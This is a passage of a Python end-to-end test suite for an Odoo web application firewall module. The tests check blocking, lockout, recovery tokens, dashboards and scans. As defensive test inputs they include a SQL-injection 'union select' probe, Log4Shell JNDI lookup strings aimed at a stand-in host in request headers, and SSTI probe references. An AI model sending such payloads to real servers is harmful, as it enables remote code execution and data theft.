"""End-to-end tests: the patched WSGI layer really blocks and logs.

The middleware runs on its own pooled connection (via ``db_connect``) and
only sees *committed* state. During tests, ``registry.cursor()`` hands out
TestCursors that share the test transaction and whose ``commit()`` is a
savepoint no-op, so fixtures for the HTTP layer are written through real
pooled connections as well (_dbwrite/_dbread below).
"""
import hashlib
import io
import json
import re
import threading
import time
from collections import deque
from contextlib import contextmanager
from datetime import timedelta
from unittest.mock import patch
from urllib.parse import urlencode

from odoo import SUPERUSER_ID, api, fields
from odoo.exceptions import UserError, ValidationError
from odoo.sql_db import db_connect
from odoo.tests import HttpCase, tagged

from ..core import middleware, recovery


@tagged("post_install", "-at_install", "ow_shield")
class TestFirewallHttp(HttpCase):

    RULE_CODE = "waf-test-blockme"

    @classmethod
    def _dbwrite(cls, fn):
        with db_connect(cls.env.cr.dbname).cursor() as cr:
            cr.rollback()  # fresh txn: pool may hold a stale RR transaction
            env = api.Environment(cr, SUPERUSER_ID, {})
            result = fn(env)
            cr.commit()
        middleware.reset_caches()
        return result

    @classmethod
    def _dbread(cls, fn):
        with db_connect(cls.env.cr.dbname).cursor() as cr:
            cr.rollback()  # fresh txn: pool may hold a stale RR transaction
            env = api.Environment(cr, SUPERUSER_ID, {})
            return fn(env)

    @classmethod
    def setUpClass(cls):
        super().setUpClass()

        def _setup(env):
            cfg = env["waf.config"].get_singleton()
            # auto_lockout_max parked deliberately high as the SUITE
            # baseline: since 19.0.2.4.0 attack credit lives in the DB
            # per network, so tests that attack from the bare test peer
            # (127.0.0.1, no X-Real-IP) accumulate one shared count
            # across the whole run. That is correct product behaviour,
            # but it would otherwise lock the test peer out of
            # unrelated tests at some random point in the suite; every
            # lockout test sets its threshold explicitly.
            cfg.write({"mode": "enforce",
                       "trusted_proxies": "127.0.0.0/8, ::1",
                       "auto_lockout_max": 10000})
            # start with counters uncarried from any previous suite run
            # on this DB (rows live 10-min windows, 2 h retention)
            env["waf.lockout.hit"].search([]).unlink()
            env["waf.login.hit"].search([]).unlink()
            blockme = env["waf.rule"].create({
                "code": cls.RULE_CODE,
                "name": "Test block rule",
                "category": "test",
                "scope": "url",
                "pattern": "/waf-test-blockme",
                "action": "block",
                "severity": 5,
                "no_session": False,
            })
            # query-scope rule with the session exemption ON, to prove the
            # exemption cannot be triggered by a forged session cookie
            sqli = env["waf.rule"].create({
                "code": "waf-test-sqli",
                "name": "Test union-select rule",
                "category": "test",
                "scope": "query",
                "pattern": r"union\s+select",
                "action": "block",
                "severity": 5,
                "no_session": True,
            })
            return blockme.id, sqli.id

        cls.rule_id, cls.sqli_rule_id = cls._dbwrite(_setup)

    @classmethod
    def tearDownClass(cls):
        def _teardown(env):
            env["waf.hit"].search([]).unlink()
            env["waf.ip.entry"].search([]).unlink()
            env["waf.lockout.hit"].search([]).unlink()
            env["waf.login.hit"].search([]).unlink()
            env["waf.rate.hit"].search([]).unlink()
            env["waf.exception"].search([]).unlink()
            env["waf.endpoint.policy"].search(
                [("code", "=like", "waf-test-%")]).unlink()
            env["waf.rule"].search([("code", "=like", "waf-test-%")]).unlink()
            env["mail.mail"].sudo().search(
                [("subject", "ilike", "OW Shield%")]).unlink()
            cfg = env["waf.config"].get_singleton()
            cfg.write({"mode": "learning", "auto_lockout_max": 10})
        cls._dbwrite(_teardown)
        super().tearDownClass()

    def _hits(self, path):
        middleware.flush_hits()
        return self._dbread(lambda env: [
            (h.rule_id.id, h.blocked, h.ip)
            for h in env["waf.hit"].search([("path", "=", path)])
        ])

    def _hit_rows(self, path):
        """Fuller view of the buffered hits for one path (round-11 tests
        assert on kind, rule_name and query, not just blocked)."""
        middleware.flush_hits()
        return self._dbread(lambda env: [
            {"kind": h.kind, "name": h.rule_name or "", "blocked": h.blocked,
             "ip": h.ip, "query": h.query or "", "method": h.method}
            for h in env["waf.hit"].search([("path", "=", path)])
        ])

    def _policy(self, code, **vals):
        """Tune a built-in endpoint policy through a committed write;
        returns the previous tuning so callers can restore it."""
        fields = ["action", "severity", "rate_max", "rate_window", "rate_key",
                  "rate_param", "rate_block_minutes", "ids_max",
                  "exempt_nets", "on_unverified"]

        def _w(env):
            pol = env["waf.endpoint.policy"].search([("code", "=", code)])
            self.assertTrue(pol, f"built-in policy {code} missing")
            before = pol.read(fields)[0]
            pol.write(vals)
            return before
        return self._dbwrite(_w)

    def _clear_net(self, ip):
        """Drop rate rows + auto entries for one probe address."""
        self._dbwrite(lambda env: (
            env["waf.rate.hit"].search([]).unlink(),
            env["waf.ip.entry"].search([("network", "=", ip + "/32")]).unlink(),
        ))

    # ---------------------------------------------------------------------

    def test_01_block_in_enforce(self):
        r = self.url_open("/waf-test-blockme")
        self.assertEqual(r.status_code, 403)
        self.assertIn(b"OW Shield", r.content)
        self.assertEqual(r.headers.get("Content-Type", "").split(";")[0],
                         "text/html")
        hits = self._hits("/waf-test-blockme")
        self.assertEqual(len(hits), 1)
        rule_id, blocked, _ip = hits[0]
        self.assertTrue(blocked)
        self.assertEqual(rule_id, self.rule_id)

    def test_02_learning_mode_does_not_block(self):
        def _setup(env):
            env["waf.config"].get_singleton().write({"mode": "learning"})
            env["waf.rule"].browse(self.rule_id).write(
                {"pattern": "/waf-test-learning"})
        self._dbwrite(_setup)

        r = self.url_open("/waf-test-learning")
        self.assertEqual(r.status_code, 404)  # matched but not blocked
        hits = self._hits("/waf-test-learning")
        self.assertEqual(len(hits), 1)
        self.assertFalse(hits[0][1])

        def _restore(env):
            env["waf.config"].get_singleton().write({"mode": "enforce"})
            env["waf.rule"].browse(self.rule_id).write(
                {"pattern": "/waf-test-blockme"})
        self._dbwrite(_restore)

    def test_03_xff_spoof_resolved_to_real_peer(self):
        # 127.0.0.1 (the test socket peer) IS in trusted proxies, so we
        # must resolve right-to-left: the spoofed leftmost XFF entry is
        # ignored and X-Real-IP wins.
        r = self.url_open(
            "/waf-test-blockme",
            headers={"X-Forwarded-For": "1.2.3.4, 5.6.7.8",
                     "X-Real-IP": "203.0.113.9"})
        self.assertEqual(r.status_code, 403)
        hits = self._hits("/waf-test-blockme")
        resolved = [h for h in hits if h[2] == "203.0.113.9"]
        self.assertEqual(len(resolved), 1)
        self.assertTrue(resolved[0][1])

    def test_04_deny_entry_blocks_everything(self):
        def _deny(env):
            env["waf.ip.entry"].create({
                "network": "127.0.0.1/32", "kind": "deny",
                "reason": "test deny",
            })
        self._dbwrite(_deny)
        try:
            r = self.url_open("/web/login")
            self.assertEqual(r.status_code, 403)
        finally:
            def _undeny(env):
                env["waf.ip.entry"].search([]).unlink()
            self._dbwrite(_undeny)

    def test_05_recovery_link_lifts_auto_block(self):
        # review critical/high: a recovery token must NOT mint a 72h allow
        # entry (an allow entry skips every rule -- an attacker who lures
        # an admin into clicking gains three days of total bypass). It
        # only deactivates the automatic deny entry it names; replays are
        # inert, and *manual* blocks are never touched.
        def _setup(env):
            env["waf.ip.entry"].create({
                "network": "198.51.100.7/32", "kind": "deny",
                "source": "auto", "reason": "test auto"})
            env["waf.ip.entry"].create({
                "network": "198.51.100.8/32", "kind": "deny",
                "source": "manual", "reason": "admin block"})
        self._dbwrite(_setup)
        cfg = self.env["waf.config"].get_singleton()
        token = recovery.make_token(
            cfg.recover_secret, self.env.cr.dbname, "198.51.100.7/32")
        r = self.url_open("/waf/recover/%s" % token)
        self.assertEqual(r.status_code, 200)

        def _state(env):
            return sorted((e.network, e.kind, e.source, e.active)
                          for e in env["waf.ip.entry"].with_context(
                              active_test=False).search([]))
        state = self._dbread(_state)
        self.assertIn(("198.51.100.7/32", "deny", "auto", False), state,
                      "auto entry lifted (deactivated, history intact)")
        self.assertIn(("198.51.100.8/32", "deny", "manual", True), state,
                      "manual admin blocks are outside the link's reach")
        self.assertFalse([e for e in state if e[1] == "allow"],
                         "recovery must never create an allow entry")
        # replay within the TTL gains nothing: the entry is already gone
        r = self.url_open("/waf/recover/%s" % token)
        self.assertEqual(r.status_code, 200)
        self.assertFalse([e for e in self._dbread(_state) if e[1] == "allow"])

    def test_06_tampered_recovery_token_rejected(self):
        cfg = self.env["waf.config"].get_singleton()
        token = recovery.make_token(
            cfg.recover_secret, self.env.cr.dbname, "198.51.100.8/32")
        db, ip, exp, sig = token.split("~")
        bad = "%s~198.51.100.99/32~%s~%s" % (db, exp, sig)
        r = self.url_open("/waf/recover/%s" % bad)
        self.assertEqual(r.status_code, 400)
        self.assertEqual(self._dbread(
            lambda env: env["waf.ip.entry"].search_count(
                [("network", "=like", "198.51.100.9%")])), 0)

    def test_07_healthcheck_scan_runs(self):
        scan = self.env["waf.scan"].create(
            {"scan_files": False, "scan_attachments": False})
        scan.action_run()
        self.assertEqual(scan.state, "done")
        n1 = len(scan.finding_ids)
        scan.action_run()  # re-run must not duplicate findings
        self.assertEqual(len(scan.finding_ids), n1)
        self.assertEqual(scan.state, "done")
        self.assertTrue(0 <= scan.score <= 100)
        self.assertIn(scan.grade, ("A", "B", "C", "D", "E", "F"))
        total = (scan.n_info + scan.n_low + scan.n_medium
                 + scan.n_high + scan.n_critical)
        # a fresh db has 'admin' login and no 2FA -> at least one finding
        self.assertGreaterEqual(total, 1)
        # posture snapshot must exist and round-trip
        posture = scan.report_posture()
        self.assertTrue(posture)
        self.assertIn(posture["mode"],
                      ("Off", "Learning (log only)", "Enforce"))
        # PDF report template must render (19 renamed web.external_layout)
        html, _fmt = self.env["ir.actions.report"]._render_qweb_html(
            self.env.ref("ow_shield.action_report_waf_scan").id, scan.ids)
        if not isinstance(html, bytes):
            html = html.encode()
        self.assertIn(b"CONFIDENTIAL", html)
        self.assertIn(b"Findings and recommendations", html)
        self.assertIn(b"Score", html)
        # redesign: numbered findings, remediation checklist, posture + scope
        self.assertIn(b"F-01", html)
        self.assertIn(b"Remediation checklist", html)
        self.assertIn(b"WAF posture at scan time", html)
        self.assertIn(b"Scan scope", html)

    def test_07b_file_scan_roots_19(self):
        # 19 regression: config["addons_path"] can be a list and the odoo
        # package has no __file__ (namespace) -> _addon_roots must survive
        scan = self.env["waf.scan"].create(
            {"scan_files": True, "scan_attachments": False})
        roots = scan._addon_roots()
        self.assertIsInstance(roots, list)
        scan._run_file_scan()  # must not raise
        self.assertEqual(scan.state, "draft")  # scan itself not started
        # must not flag its own package (signature literals self-match)
        self.assertFalse([f for f in scan.finding_ids
                          if "/ow_shield/" in (f.path or "")])

    def test_07c_failed_rerun_clears_previous_verdict(self):
        # review P2: a rerun that dies halfway must not retain the previous
        # healthy grade/score/posture, and the report must not print a verdict
        scan = self.env["waf.scan"].create(
            {"scan_files": False, "scan_attachments": True})
        scan.action_run()
        self.assertEqual(scan.state, "done")
        self.assertTrue(scan.grade)
        self.assertTrue(scan.posture_json)
        with patch.object(type(scan), "_run_attachment_scan",
                          autospec=True, side_effect=RuntimeError("boom")):
            scan.action_run()
        self.assertEqual(scan.state, "error")
        self.assertFalse(scan.grade)
        self.assertEqual(scan.score, 0)
        self.assertEqual(scan.n_critical, 0)
        self.assertFalse(scan.posture_json)
        html, _fmt = self.env["ir.actions.report"]._render_qweb_html(
            self.env.ref("ow_shield.action_report_waf_scan").id, scan.ids)
        if not isinstance(html, bytes):
            html = html.encode()
        self.assertIn(b"INCOMPLETE SCAN", html)
        self.assertNotIn(b"No significant weaknesses", html)

    def test_07d_posture_snapshot_skips_expired_entries(self):
        # review P2: the appendix must use the engine's validity rule
        # (active AND not expired), not plain active=True
        now = fields.Datetime.now()
        self.env["waf.ip.entry"].create([
            {"network": "203.0.113.71/32", "kind": "deny", "source": "manual",
             "expires": now + timedelta(days=1)},
            {"network": "203.0.113.72/32", "kind": "deny", "source": "auto",
             "expires": now - timedelta(days=1)},  # expired, cleanup pending
        ])
        scan = self.env["waf.scan"].create(
            {"scan_files": False, "scan_attachments": False})
        scan.action_run()
        posture = scan.report_posture()
        self.assertTrue(posture)
        self.assertEqual(posture["ip_deny"], 1)
        self.assertEqual(posture["auto_lockouts"], 0)

    def test_07e_db_error_in_check_marks_scan_error(self):
        # review round-2 low #4: a check tripping a real *database* error
        # aborted the whole transaction, so the state="error" write in the
        # handler failed too -- action_run raised and the scan lost its
        # verdict. Each step now runs inside its own savepoint.
        def boom(self):
            self.env.cr.execute("SELECT * FROM waf_no_such_table")

        scan = self.env["waf.scan"].create(
            {"scan_files": True, "scan_attachments": False})
        with patch.object(type(scan), "_run_file_scan",
                          autospec=True, side_effect=boom):
            scan.action_run()
        self.assertEqual(scan.state, "error")
        self.assertFalse(scan.grade)

    @classmethod
    @contextmanager
    def _pinned_config(cls, **vals):
        """Pin COMMITTED waf.config values for code reading it through
        a stale env (round 16 login tests).

        The class test transaction's REPEATABLE READ snapshot predates
        every committed config change (setUpClass's own _dbwrite first),
        so a test-env write() of waf_config dies on 40001 at flush --
        the very reason every config fixture in this suite is committed
        through the pool instead. For the login layer, which reads
        get_singleton() with its own (stale) env, the read itself is
        re-pointed at a fresh committed cursor for the test's duration;
        the pin is committed, so pool-side machinery (middleware,
        _waf_apply_login_lockout) sees the same values, and the pin is
        reverted on exit.
        """
        with db_connect(cls.env.cr.dbname).cursor() as cr:
            cr.rollback()
            env = api.Environment(cr, SUPERUSER_ID, {})
            cfg = env["waf.config"].get_singleton()
            before = {f: cfg[f] for f in vals}
            if vals:
                cfg.write(vals)
                env.flush_all()  # ORM writes are lazy: get the UPDATE
                cr.commit()      # out before the commit is meaningful
            cr.rollback()  # fresh snapshot for the reads below
            # cfg is captured ONCE and returned verbatim: calling
            # get_singleton() inside the patch would recurse into the
            # patched method itself. Its cache already carries the pinned
            # values (write() refreshes the cache even when lazy), and
            # uncached fields read fresh through the open cursor.
            with patch.object(type(cls.env["waf.config"]),
                              "get_singleton",
                              lambda self_, *a, **k: cfg):
                try:
                    yield
                finally:
                    cfg.write(before)
                    env.flush_all()
                    cr.commit()

    def test_08_login_failures_lock_out_ip(self):
        # NB: the override reads waf.config through the request env, whose
        # REPEATABLE READ snapshot in tests predates _dbwrite — so this test
        # uses the default login_fail_max (10), not a tuned value.
        #
        # Round 16 F02 made login credit honour waf.config.mode; this
        # scenario IS the enforce lockout, so enforce is pinned through
        # _pinned_config (a test-env write of waf_config would die on
        # 40001 -- see the helper).
        with self._pinned_config(mode="enforce"):
            Users = self.env["res.users"].with_context(ip="198.51.100.77")
            for i in range(10):
                with self.assertRaises(Exception):
                    Users.authenticate(
                        {"type": "password", "login": "waf-brute-user",
                         "password": "nope-%d" % i}, {})
            entries = self._dbread(lambda env: [
                (e.network, e.kind, e.source)
                for e in env["waf.ip.entry"].search(
                    [("source", "=", "auto"), ("kind", "=", "deny")])])
            self.assertEqual(entries, [("198.51.100.77/32", "deny", "auto")])
        self._dbwrite(lambda env: env["waf.ip.entry"].search([]).unlink())

    def test_09_login_runs_without_waf_rights(self):
        # /web/login authenticates as the public user, which is NOT in the
        # firewall group: the override must sudo every waf access, or the
        # login POST itself would die on our own ACLs (regression test).
        public = self.env.ref("base.public_user")
        Users = self.env["res.users"].with_user(public).with_context(
            ip="203.0.113.66")
        with self.assertRaises(Exception) as cm:
            Users.authenticate({"type": "password", "login": "nope",
                                "password": "wrong"}, {})
        self.assertNotIn("waf.config", str(cm.exception))
        self._dbwrite(lambda env: env["waf.ip.entry"].search([]).unlink())

    def test_10_dashboard_payload(self):
        # aggregation endpoint behind the OWL dashboard + Chart.js graphs.
        # Must run through _dbread: middleware hits are committed on pooled
        # connections, invisible to this test's REPEATABLE READ snapshot.
        data = self._dbread(
            lambda env: env["waf.config"].get_dashboard_data(days=7))
        self.assertEqual(data["days"], 7)
        self.assertEqual(data["period"], "7d")
        # daily buckets: day -7 .. today, zero-filled
        self.assertEqual(len(data["timeline"]), 8)
        self.assertTrue(all(p["date"].endswith("00:00:00")
                            for p in data["timeline"]))
        self.assertGreaterEqual(sum(p["total"] for p in data["timeline"]), 1)
        self.assertIn("test", [c["label"] for c in data["by_category"]])
        # hourly buckets: last 24 h .. now
        hourly = self._dbread(
            lambda env: env["waf.config"].get_dashboard_data(days=1)["timeline"])
        self.assertEqual(len(hourly), 25)
        # unknown windows fall back to 24 h
        self.assertEqual(self._dbread(
            lambda env: env["waf.config"].get_dashboard_data(days=999))["days"], 1)

        # world map payload: geolocated hits aggregate per country
        def _seed_map(env):
            # NB: .201 deliberately has the highest hit count in the whole
            # table at read time: top_ips is ORDER BY count DESC LIMIT 8,
            # and a mere 2 would be tie-flaky against whatever traffic the
            # earlier tests happened to leave behind (run-to-run plan
            # differences change tie order).
            env["waf.hit"].create([
                {"ref": "mapnl00001", "ip": "203.0.113.201", "country": "NL",
                 "method": "GET", "path": "/waf-map-test", "kind": "rule",
                 "action": "block", "mode": "enforce", "blocked": True,
                 "severity": 5, "rule_name": "map test NL"},
                {"ref": "mapnl00002", "ip": "203.0.113.201", "country": "NL",
                 "method": "GET", "path": "/waf-map-test", "kind": "rule",
                 "action": "log", "mode": "learning", "blocked": False,
                 "severity": 2, "rule_name": "map test NL2"},
                *[{"ref": "mapnl0000%d" % i, "ip": "203.0.113.201",
                   "country": "NL", "method": "GET", "path": "/waf-map-test",
                   "kind": "rule", "action": "log", "mode": "learning",
                   "blocked": False, "severity": 1,
                   "rule_name": "map test NL filler %d" % i}
                  for i in (3, 4, 5)],
                {"ref": "mapde00001", "ip": "203.0.113.203", "country": "DE",
                 "method": "GET", "path": "/waf-map-test", "kind": "rule",
                 "action": "block", "mode": "enforce", "blocked": True,
                 "severity": 5, "rule_name": "map test DE"},
                # review P2: payload must carry every distinct origin —
                # codes with no map geometry (SG) and unattributed hits
                # (empty country -> '?') — and never truncate at 100 rows
                {"ref": "mapsg00001", "ip": "203.0.113.204", "country": "SG",
                 "method": "GET", "path": "/waf-map-test", "kind": "rule",
                 "action": "block", "mode": "enforce", "blocked": True,
                 "severity": 5, "rule_name": "map test SG"},
                {"ref": "mapunk00001", "ip": "203.0.113.205", "country": "",
                 "method": "GET", "path": "/waf-map-test", "kind": "ip",
                 "action": "block", "mode": "enforce", "blocked": True,
                 "severity": 5, "rule_name": "map test unattributed"},
                *[{"ref": "mapmany%03d" % i, "ip": "198.18.%d.%d" % (i // 250, i % 250),
                   "country": "Q%02d" % i, "method": "GET",
                   "path": "/waf-map-many", "kind": "rule", "action": "log",
                   "mode": "learning", "blocked": False, "severity": 1,
                   "rule_name": "map many %d" % i}
                  for i in range(101)],
            ])
        self._dbwrite(_seed_map)
        data = self._dbread(
            lambda env: env["waf.config"].get_dashboard_data(days=7))
        countries = {c["code"]: c for c in data["by_country"]}
        self.assertEqual(countries["NL"]["total"], 5)
        self.assertEqual(countries["NL"]["blocked"], 1)
        self.assertEqual(countries["DE"], {"code": "DE", "total": 1,
                                           "blocked": 1})
        self.assertEqual(countries["SG"]["total"], 1)  # no-geometry codes kept
        self.assertGreaterEqual(countries["?"]["total"], 1)  # unattributed
        self.assertEqual(len([c for c in data["by_country"]
                              if c["code"].startswith("Q")]), 101)  # no LIMIT
        # top attackers additionally carry the origin country per IP
        top_rows = {r["label"]: r for r in data["top_ips"]}
        self.assertEqual(top_rows["203.0.113.201"]["count"], 5)
        self.assertEqual(top_rows["203.0.113.201"]["country"], "NL")
        self.assertTrue(all("country" in r for r in data["top_ips"]))
        self.assertIsInstance(data["country_ready"], bool)
        self._dbwrite(lambda env: env["waf.hit"].search(
            [("path", "in", ("/waf-map-test", "/waf-map-many"))]).unlink())

    def test_11_config_singleton_guard(self):
        # duplicates silently desynced the form from the engine: a second
        # config row must raise, and the table must hold exactly one row
        from odoo.exceptions import UserError
        with self.assertRaises(UserError):
            self.env["waf.config"].create({})
        self.assertEqual(self.env["waf.config"].search_count([]), 1)

    def test_12_large_body_survives_replay(self):
        # review P1: replaying the scanned 64 KiB prefix ALSO decremented
        # the underlying stream's byte budget, so the app saw a truncated
        # body / ClientDisconnected (HTTP 400) for anything > body_scan_max
        payload = b"a" * 100000
        raw = io.BytesIO(payload)
        prefix = raw.read(65536)
        stream = middleware._ReplayStream(prefix, raw, len(payload) - 65536)
        self.assertEqual(stream.read(16), payload[:16])       # mixed read
        self.assertEqual(stream.read(), payload[16:])          # read-to-EOF

        # review P2 round 2: one line spanning the prefix boundary must be
        # returned WHOLE (the fixed version used to split it at 65536);
        # asserting only via join() would mask that
        whole = payload + b"\n"
        raw = io.BytesIO(whole)
        stream = middleware._ReplayStream(raw.read(65536), raw,
                                          len(whole) - 65536)
        self.assertEqual(stream.readline(), whole)             # no split
        raw = io.BytesIO(whole)
        stream = middleware._ReplayStream(raw.read(65536), raw,
                                          len(whole) - 65536)
        self.assertEqual(stream.readline(1000), b"a" * 1000)   # size cap kept
        raw = io.BytesIO(whole)
        stream = middleware._ReplayStream(raw.read(65536), raw,
                                          len(whole) - 65536)
        self.assertEqual(stream.readlines(), [whole])          # exact reassembly

        # end-to-end: 100 KB JSON-RPC body must reach Odoo intact (the db
        # service call itself may error -> that is a 200 json envelope;
        # the body bug produced a 400 before the fix)
        body = json.dumps({
            "jsonrpc": "2.0", "id": 1, "method": "call",
            "params": {"service": "db", "method": "list",
                       "args": {"pad": "A" * 90000}},
        }).encode()
        self.assertGreater(len(body), 65536)
        r = self.url_open("/web/database/list", data=body,
                          headers={"Content-Type": "application/json"})
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"jsonrpc", r.content)

    def test_13_forged_session_cookie_no_bypass(self):
        # review P1 round 2: the exemption now requires a *verified*
        # authenticated session (odoo's server-side session store, uid
        # claim); a cookie string proves nothing -- not even on RPC paths
        for path in ("/waf-test-probe", "/web/dataset/call_kw"):
            r = self.url_open(path + "?x=union%20select")
            self.assertEqual(r.status_code, 403)
            r = self.url_open(path + "?x=union%20select",
                              headers={"Cookie": "session_id=forged"})
            self.assertEqual(r.status_code, 403)
        # a genuine logged-in session DOES get the exemption on RPC paths...
        self.authenticate("admin", "admin")
        r = self.url_open("/web/dataset/call_kw?x=union%20select")
        self.assertNotEqual(r.status_code, 403)
        # ...but verified users are still not exempt on other paths
        r = self.url_open("/waf-test-probe?x=union%20select")
        self.assertEqual(r.status_code, 403)
        # and neither are "/jsonrpc"-style lookalikes of the /json prefix
        r = self.url_open("/jsonrpc?x=union%20select",
                          headers={"Cookie": "session_id=forged"})
        self.assertEqual(r.status_code, 403)

    def test_14_recovery_link_reachable_from_blocked_ip(self):
        # review P2: the IP deny short-circuited /waf/recover/*, so the
        # emailed recovery link was unusable from the very IP it unblocks
        self._dbwrite(lambda env: env["waf.ip.entry"].create({
            "network": "203.0.113.55/32", "kind": "deny",
            "source": "auto", "reason": "test deny"}))
        try:
            r = self.url_open("/web/login",
                              headers={"X-Real-IP": "203.0.113.55"})
            self.assertEqual(r.status_code, 403)  # deny active
            cfg = self.env["waf.config"].get_singleton()
            token = recovery.make_token(
                cfg.recover_secret, self.env.cr.dbname, "203.0.113.55/32")
            r = self.url_open("/waf/recover/%s" % token,
                              headers={"X-Real-IP": "203.0.113.55"})
            self.assertEqual(r.status_code, 200)
            # the auto entry is lifted (active_test hides deactivated rows)
            # and no allow entry exists -- normal rule evaluation resumes
            self.assertEqual(self._dbread(
                lambda env: env["waf.ip.entry"].search_count(
                    [("network", "=", "203.0.113.55/32")])), 0)
            # same IP no longer denied (in production the entry takes effect
            # once the middleware's policy snapshot expires, max ~5 s)
            middleware.reset_caches()
            r = self.url_open("/web/login",
                              headers={"X-Real-IP": "203.0.113.55"})
            self.assertNotEqual(r.status_code, 403)
        finally:
            self._dbwrite(lambda env: env["waf.ip.entry"].search([]).unlink())

    def test_15_block_rule_hits_trigger_auto_lockout(self):
        # review P2: only action="auto" rules incremented the counter and
        # NO bundled rule uses that action -> default-on automatic IP
        # lockout was inert against real attack traffic
        def _setup(env):
            # explicit threshold: the suite baseline parks max far above
            # anything incidental (shared credit now accumulates across
            # tests in the DB, see setUpClass); and start the network's
            # window clean so a previous suite run on this DB cannot
            # leak credit into this one
            cfg = env["waf.config"].get_singleton()
            before = cfg.auto_lockout_max
            env["waf.lockout.hit"].search(
                [("network", "=", "203.0.113.56/32")]).unlink()
            cfg.write({"auto_lockout_max": 10})
            return before

        before = self._dbwrite(_setup)
        try:
            middleware._counters.clear()
            for _i in range(10):  # explicit auto_lockout_max = 10
                r = self.url_open("/waf-test-blockme",
                                  headers={"X-Real-IP": "203.0.113.56"})
                self.assertEqual(r.status_code, 403)
            entries = self._dbread(lambda env: [
                (e.network, e.kind, e.source) for e in env["waf.ip.entry"].search(
                    [("source", "=", "auto"), ("kind", "=", "deny")])])
            self.assertIn(("203.0.113.56/32", "deny", "auto"), entries)
            # locked-out IP is now denied even on benign paths (once the
            # policy snapshot refreshes, max ~5 s in production)
            middleware.reset_caches()
            r = self.url_open("/web/login", headers={"X-Real-IP": "203.0.113.56"})
            self.assertEqual(r.status_code, 403)
            self._dbwrite(lambda env: env["waf.ip.entry"].search(
                [("source", "=", "auto")]).unlink())
            middleware._counters.clear()
        finally:
            self._dbwrite(lambda env: env["waf.config"].get_singleton().write(
                {"auto_lockout_max": before}))

    def test_16_db_resolution_list_db_false(self):
        # review P1 round 3: with list_db=False (the hardened production
        # setting) a non-forced list_dbs() raises AccessDenied (service/
        # db.py:446); the old resolver then fell back to the alphabetically
        # first loaded registry, ignoring the host dbfilter. Odoo itself
        # resolves with db_list(force=True) -- the WAF must do the same,
        # and any registry fallback must pass db_filter. "a-weak" sorts
        # first and must never be picked for this host.
        import odoo.service.db as srvdb
        from odoo.exceptions import AccessDenied
        from odoo.tools import config as srv

        dbname = self.env.cr.dbname
        orig_list_dbs, orig_loaded = srvdb.list_dbs, middleware._loaded_dbs
        orig_list_db, orig_filter = srv["list_db"], srv["dbfilter"]

        def listed(force=False):
            # faithful emulation of list_db=False semantics
            if not srv["list_db"] and not force:
                raise AccessDenied()
            return sorted(["a-weak", dbname])

        srv["list_db"] = False
        srv["dbfilter"] = "^%s$" % dbname
        srvdb.list_dbs = listed
        middleware._loaded_dbs = lambda: ["a-weak", dbname]
        try:
            middleware.reset_caches()
            environ = {"HTTP_HOST": "www.example.com"}
            self.assertEqual(middleware._resolve_db(environ, None), dbname)
            # a dbfilter matching nothing must yield None (odoo itself
            # cannot route here) -- never an unrelated database
            srv["dbfilter"] = "^unmatched-%h$"
            middleware.reset_caches()
            self.assertIsNone(middleware._resolve_db(environ, None))
        finally:
            srvdb.list_dbs, middleware._loaded_dbs = orig_list_dbs, orig_loaded
            srv["list_db"], srv["dbfilter"] = orig_list_db, orig_filter
            middleware.reset_caches()

    def test_17_geo_attribution_without_country_blocking(self):
        # country_mode stays "off" (the default), but when a MaxMind mmdb
        # is installed every hit must still record the origin country --
        # the dashboard world map feeds on it. Enforcement semantics are
        # unchanged: engine.evaluate keeps gating on country_mode.
        middleware.reset_caches()
        try:
            from odoo.http import root
            root.geoip_country_db
        except Exception:
            self.skipTest("no MaxMind GeoLite2-Country database installed")
        r = self.url_open("/waf-test-blockme",
                          headers={"X-Real-IP": "8.8.8.8"})
        self.assertEqual(r.status_code, 403)
        middleware.flush_hits()
        country = self._dbread(
            lambda env: env["waf.hit"].search(
                [("ip", "=", "8.8.8.8")], limit=1).country)
        self.assertEqual(country, "US")
        self.assertEqual(self._dbread(
            lambda env: env["waf.config"].get_singleton().country_mode), "off")

    def test_18_log4shell_in_arbitrary_header_blocked(self):
        # review P2 (live waf-test run): header-scoped rules used to only
        # inspect the 4 proxy headers -- ${jndi:} in a custom header or
        # in the User-Agent (the canonical Log4Shell vector) reached the
        # app completely unexamined. Built-in sev-5 rules cover all now.
        try:
            r = self.url_open("/waf-log4shell-xhdr", headers={
                "X-WafProbe": "${jndi:ldap://probe.invalid/a}"})
            self.assertEqual(r.status_code, 403)
            r = self.url_open("/waf-log4shell-ua", headers={
                "User-Agent": "${jndi:dns://probe.invalid}"})
            self.assertEqual(r.status_code, 403)
            for path in ("/waf-log4shell-xhdr", "/waf-log4shell-ua"):
                hits = self._hits(path)
                self.assertEqual(len(hits), 1, path)
                self.assertTrue(hits[0][1], path)  # blocked=True
        finally:
            # two sev-5 hits reach the auto-lockout threshold: drop the
            # resulting entry so the rest of the class keeps working
            self._dbwrite(lambda env: env["waf.ip.entry"].search(
                [("source", "=", "auto")]).unlink())
            middleware.reset_caches()

    def test_19_xri_multi_rule_retired(self):
        # live waf-test: "Multiple X-Real-IP values" fired only on the
        # LB+nginx chain's own duplicated header (nginx overwrites any
        # client-sent X-Real-IP, so it never caught an attacker) and
        # logged every legit page view. Removed from the built-in pack:
        # fresh installs lack it, and the loader archives leftover rows
        # from older installs on upgrade.
        purge = lambda env: env["waf.rule"].with_context(
            active_test=False).search(
                [("code", "=", "waf-hdr-xri-multi")]).unlink()
        self._dbwrite(purge)  # idempotent on upgrade-retests of same db
        self._dbwrite(lambda env: env["waf.rule"].load_builtin_rules())
        self.assertFalse(self._dbread(lambda env: env["waf.rule"]
                                     .with_context(active_test=False)
                                     .search([("code", "=",
                                               "waf-hdr-xri-multi")])
                                     .exists()))

        def _mk(env):  # simulate a row left over from an older install
            env["waf.rule"].create({
                "code": "waf-hdr-xri-multi",
                "name": "Multiple X-Real-IP values",
                "category": "headers", "scope": "url",
                "pattern": "zzz-retired", "action": "log", "severity": 4,
                "source": "builtin"})
        self._dbwrite(_mk)
        self._dbwrite(lambda env: env["waf.rule"].load_builtin_rules())
        state = self._dbread(lambda env: [
            (r.id, r.active) for r in env["waf.rule"]
            .with_context(active_test=False).search(
                [("code", "=", "waf-hdr-xri-multi")])])
        self.assertEqual(len(state), 1)
        self.assertFalse(state[0][1])  # archived, hit history intact

    def test_20_builtin_arith_ssti_blocks(self):
        # 19.0.2.2.1 pack rules: arithmetic probes ({{7*7}}, ${7+7}) used
        # to sail through unexamined while {{config}}-style probes were
        # already caught. Query scope, so they fire for anonymous traffic.
        self.assertTrue(self._dbread(
